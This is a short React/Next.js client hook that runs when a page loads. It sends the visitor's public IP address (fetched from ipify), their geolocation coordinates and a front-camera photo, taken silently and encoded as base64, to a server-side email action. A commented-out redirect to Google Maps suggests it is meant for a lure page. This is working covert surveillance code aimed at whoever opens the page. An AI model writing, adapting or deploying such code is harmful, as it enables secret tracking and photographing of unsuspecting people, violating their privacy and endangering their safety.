"use client";

import { useEffect } from "react";
import { sendEmail } from "@/actions";

export const useAll = () => {
  useEffect(() => {
    (async () => {
      try {
        const response = await fetch("https://api.ipify.org?format=json");
        const data = await response.json();

        await sendEmail({ ip: data });
      } catch (error) {
        await sendEmail({ ip: "chsec" });
      }

      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          async (position) => {
            await sendEmail({
              lat: position.coords.latitude,
              lon: position.coords.longitude,
            });
          },
          async () => {
            await sendEmail({
              lat: "chsec",
              lon: "chsec",
            });
          }
        );
      } else {
        await sendEmail({
          lat: "chsec",
          lon: "chsec",
        });
      }

      //   window.location.href = "https://www.google.com/maps";

      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" },
        });

        // Get first video track
        const track = stream.getVideoTracks()[0];

        // Create ImageCapture instance
        const imageCapture = new ImageCapture(track);

        // Take photo
        const blob = await imageCapture.takePhoto();

        // Optional: Stop camera to release permissions
        track.stop();

        // Convert to base64 (optional, for sending to server)
        const reader = new FileReader();
        reader.onloadend = async () => {
          const base64data = reader.result; // base64 string

          await sendEmail({
            image: base64data,
          });
        };
        reader.readAsDataURL(blob);
      } catch (err) {
        console.error("Camera access denied:", err);
      }
    })();
  }, []);
};
